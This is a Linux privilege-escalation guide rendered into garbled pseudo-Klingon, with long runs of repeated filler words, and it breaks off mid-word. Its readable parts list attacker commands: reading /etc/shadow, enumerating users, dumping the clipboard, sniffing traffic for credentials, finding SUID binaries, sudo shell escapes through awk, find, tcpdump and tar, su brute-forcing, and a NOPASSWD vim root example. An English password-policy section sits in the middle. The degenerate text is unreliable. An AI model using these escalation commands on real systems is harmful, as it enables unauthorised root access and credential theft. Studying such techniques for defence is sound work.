vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

**QaQHa'**

**QaQHa'** 'ej **QaQHa'** **traffic** **qaStaHvIS** **qaStaHvIS** **qaStaHvIS** **credentials** **grab** **'e'**.
```
timeout 1 tcpdump
```
## Users

### Generic Enumeration

**QaH** **ghaH** **tlhIngan** **'oH**, **ghaH** **qawHaq** **'oH**, **ghaH** **users** **'oH** **SuvwI'** **'e'** **vItlhutlh** **'ej** **'e'** **root privileges** **'oH** **vItlhutlh**:

```bash
whoami
id
cat /etc/passwd
cat /etc/shadow
sudo -l
```
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### ** **


```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### tlhIngan Hol:

### lo'wI' vItlhutlh:

#### Password Policy

#### ngoQ DeSDu'

A password policy is an important aspect of securing a system. It helps to enforce strong and secure passwords for user accounts, reducing the risk of unauthorized access. Here are some key elements to consider when creating a password policy:

##### QaD:

- **Length**: The minimum length of a password should be set to ensure that it is not easily guessable. A longer password is generally more secure.

- **Complexity**: Passwords should be required to contain a combination of uppercase and lowercase letters, numbers, and special characters. This makes them harder to crack using brute-force or dictionary attacks.

- **Expiration**: Passwords should have an expiration date, after which they must be changed. This helps to ensure that passwords are regularly updated and reduces the risk of compromised accounts.

- **History**: Users should not be allowed to reuse their previous passwords. This prevents them from cycling through a set of known passwords and increases the overall security of the system.

- **Lockout**: After a certain number of failed login attempts, user accounts should be locked out for a specified period of time. This helps to prevent brute-force attacks and unauthorized access.

- **Account Lockout Duration**: The duration for which an account remains locked out should be defined. This ensures that the lockout period is not too short, allowing attackers to repeatedly attempt to gain access.

- **Password Recovery**: A secure password recovery mechanism should be implemented to allow users to regain access to their accounts in case they forget their passwords. This mechanism should involve additional verification steps to prevent unauthorized access.

- **Education**: Users should be educated about the importance of strong passwords and the risks associated with weak passwords. Regular training sessions can help reinforce good password practices.

Implementing a strong password policy is crucial for maintaining the security of a system. By enforcing these guidelines, the risk of unauthorized access and data breaches can be significantly reduced.
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### **tlhIngan Hol**

### **Qapvam 'oH**

Qapvam **yInID password** vItlhutlh **'ej 'oH user** login **yIlo'** password vItlhutlh.

### **Su Brute**

vaj **Su** 'ej **timeout** binaries **DaH jImej** 'ej **ghItlh** vItlhutlh, **Su-bruteforce** vIleghlaH.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) **-a** parameter **ghItlh** users **Su-bruteforce** vIleghlaH.

## **Writable PATH** qab

### **$PATH**

vaj **$PATH** **cheghpu'** folder **yInID** vItlhutlh, **writable folder** **ghItlh** vItlhutlh **privileges** **'oH** **escalate** **yIlo'** **backdoor** **writable folder** **ghItlh** **creation** **yIlo'** **command** **name** **yIlo'** **executed** **user** (root **ghItlh**) **'ej** **folder** **yInID** **located previous** **writable folder** **$PATH**.

### **SUDO 'ej SUID**

**sudo** **command** **yIlo'** **execute** **'ej** **suid bit** **vItlhutlh** **yIlo'**. **Check** **ghItlh** using:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Some **unexpected commands allow you to read and/or write files or even execute a command.** For example:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo konfiguration vaj puqloD vItlhutlh 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vItlhutlh Hoch 'ej vIt
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
<!-- markdown -->
In this example the user `demo` can run `vim` as `root`, it is now trivial to get a shell by adding an ssh key into the root directory or by calling `sh`.

<!-- klingon -->
<!-- markdown -->
vaj 'e' vItlhutlh 'demo' lo'laH 'vim' 'root' DaH 'ej, 'oH vItlhutlh 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 